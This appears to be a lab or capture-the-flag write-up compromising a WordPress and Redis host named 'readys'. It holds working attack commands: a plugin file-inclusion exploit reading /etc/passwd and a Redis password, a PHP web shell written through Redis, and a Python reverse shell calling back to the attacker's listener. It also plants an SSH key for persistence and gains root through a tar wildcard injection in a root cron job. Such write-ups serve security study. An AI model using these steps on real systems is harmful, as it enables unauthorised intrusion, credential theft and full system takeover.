## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.241.166

# HOSTNAME
readys
# OPERATING SYSTEM
# cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
22/tcp open ssh syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
6379/tcp open  redis   syn-ack ttl 61 Redis key-value store
```
# ENUMERATION
## PORT 6379 
```bash
# Nmap
6379/tcp open  redis   syn-ack ttl 61 Redis key-value store

# Enumeration using redis-cli tool
sudo redis-cli -h $ip 
192.168.241.166:6379> info
NOAUTH Authentication required.

- Need valid credentials to access the Redis instance since "NOAUTH Authentication required."

- From LFI Exploit of wordpress site editor found redis server auth creds
- Ready4Redis?
sudo redis-cli -h $ip 
192.168.241.166:6379> auth Ready4Redis?
OK                             
192.168.241.166:6379> info 
# Server                    
redis_version:5.0.14 
config_file:/etc/redis/redis.conf

- Found redis server version : 5.0.14
```
## PORT 80 
```bash
# Nmap
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))

# using curl and whatweb
sudo whatweb $url
- Server: Apache/2.4.38 (Debian)
- http://192.168.241.166 [200 OK] 
- HTML5
- HTTPServer[Debian Linux][Apache/2.4.38 (Debian)]
- JQuery[3.5.1]
- MetaGenerator[WordPress 5.7.2]
- Script[text/javascript], 
- Title[Readys &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.7.2]

# Links from source code
sudo curl -s $url| grep -oP 'href="\K[^"]+' | less
http://192.168.241.166/index.php/feed/
http://192.168.241.166/index.php/comments/feed/
http://192.168.241.166/index.php/wp-json/
http://192.168.241.166/xmlrpc.php?rsd
http://192.168.241.166/wp-includes/wlwmanifest.xml
#content
http://192.168.241.166/index.php/2021/07/11/hello-world/
http://192.168.241.166/index.php/category/uncategorised/
http://192.168.241.166/index.php/2021/07/11/hello-world/
http://192.168.241.166/index.php/2021/07/11/hello-world/#comment-1

# Worpdress CMS Enumeration
sudo wpscan --url $url -e
sudo wpscan --url $url -e p --plugins-detection aggressive
sudo wpscan --url $url -e ap,at,cb,dbe

- WordPress version 5.7.2 identified (Insecure, released on 2021-05-12)
- WordPress theme in use: twentytwentyone - Version: 1.3 (80% confidence)
- Found username - admin
- Plugin - akismet -  Version: 4.1.9 (100% confidence)
- Found Plugin - site-editor  | Version: 1.1.1 (80% confidence)

# Exploit
WordPress Plugin Site Editor 1.1.1 - Local File Inclusion | php/webapps/44340.txt
- LFI (Works)
curl http://192.168.241.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

- Found user from /etc/passwd
- alice

- Using LFI reading redis config file 
- /etc/redis/redis.conf
- Found redis password on file /etc/redis/redis.conf 
	- requirepass Ready4Redis?
- password - "Ready4Redis?"


```
## PORT 22 
```bash
# Nmap
22/tcp open ssh syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
```
## INITIAL FOOTHOLD
```bash
- Try to upload file using redis server for RCE
- Reference https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#php-webshell
- Check the webroot folder config for apache /etc/systemd/system/redis.service
- Tried to upload php shell to folder /var/www/html :( unable to write to the folder
- Checking the service file on /etc/systemd/system/redis.service

- Found writable directories
ReadWriteDirectories=-/etc/redis
ReadWriteDirectories=-/opt/redis-files
ReadWritePaths=-/var/lib/redis
ReadWritePaths=-/var/log/redis
ReadWritePaths=-/var/run/redis

- Reference https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#php-webshell
- Trying to write on directory /opt/redis-files using redis-cli
192.168.241.166:6379> 
192.168.241.166:6379> config set dir /opt/redis-files
OK
192.168.241.166:6379> config set dbfilename redis.php
OK
192.168.241.166:6379> set test "<?php system($_GET['cmd']);?>"
OK
192.168.241.166:6379> save
OK
192.168.241.166:6379> 

- Web shell via browser
http://192.168.241.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/redis.php&cmd=id
uid=1000(alice) gid=1000(alice) groups=1000(alice)

- Proper shell 
http://192.168.241.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/redis.php&cmd=which%20python
/usr/bin/python

- Python Shell
http://192.168.241.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/redis.php&cmd=python%20-c%20"import%20os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%27192.168.45.190%27,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(%27HISTFILE%27,%27/dev/null%27);pty.spawn([%27/bin/bash%27,%27-i%27]);s.close();exit();"


sudo nc -nvlp 8888                        
listening on [any] 8888 ...
connect to [192.168.45.190] from (UNKNOWN) [192.168.241.166] 55814
<ite-editor/editor/extensions/pagebuilder/includes$ id
id
uid=1000(alice) gid=1000(alice) groups=1000(alice)
<ite-editor/editor/extensions/pagebuilder/includes$

# Shell upgrade
Ctrl+z  
stty raw -echo; fg
export TERM=xterm-256color
stty rows 55 cols 238
alias ll='ls -lsaht --color=auto'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp

# Proper SSH
- From kali machine
ssh-keygen -f myshell
cat myshell.pub | pbcopy

- From victim machine
cd /home/alice
mkdir .ssh
cd .ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICfcIZQ1+4kxqqz0cLlX//IYGZ+eVmWryc1hmT+rTM5b kali@kali" > authorized_keys
chmod 0600 authorized_keys

- From kali Machine
sudo ssh -i myshell alice@$ip
```
## PRIVILEGE ESCALATION
```bash
cat /etc/crontab
*/3 * * * * root /usr/local/bin/backup.sh

alice@readys:~$ cat  /usr/local/bin/backup.sh
#!/bin/bash
cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
tar -cf /opt/backups/website.tar *
fi

- Seems like the script backup.sh runs from folder /var/www/html
- Wildcard Privesc - Reference - https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
cd /var/www/html
echo "chmod +s /usr/bin/find" > shell.sh
chmod +x ./shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

- Now check the permission for /usr/bin/find
alice@readys:/var/www/html$ ls -la /usr/bin/find
-rwsr-sr-x 1 root root 315904 Feb 16  2019 /usr/bin/find

- GTFOBINS
alice@readys:/var/www/html$ find . -exec /bin/sh -p \; -quit
# id
uid=1000(alice) gid=1000(alice) euid=0(root) egid=0(root) groups=0(root),1000(alice)
# whoami
root

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Fri Nov 29 08:57:46 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.241.166
Nmap scan report for 192.168.241.166
Host is up, received echo-reply ttl 61 (0.037s latency).
Scanned at 2024-11-29 08:57:48 IST for 32s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Readys &#8211; Just another WordPress site
|_http-generator: WordPress 5.7.2
|_http-server-header: Apache/2.4.38 (Debian)
6379/tcp open  redis   syn-ack ttl 61 Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 29 08:58:20 2024 -- 1 IP address (1 host up) scanned in 34.27 seconds

```

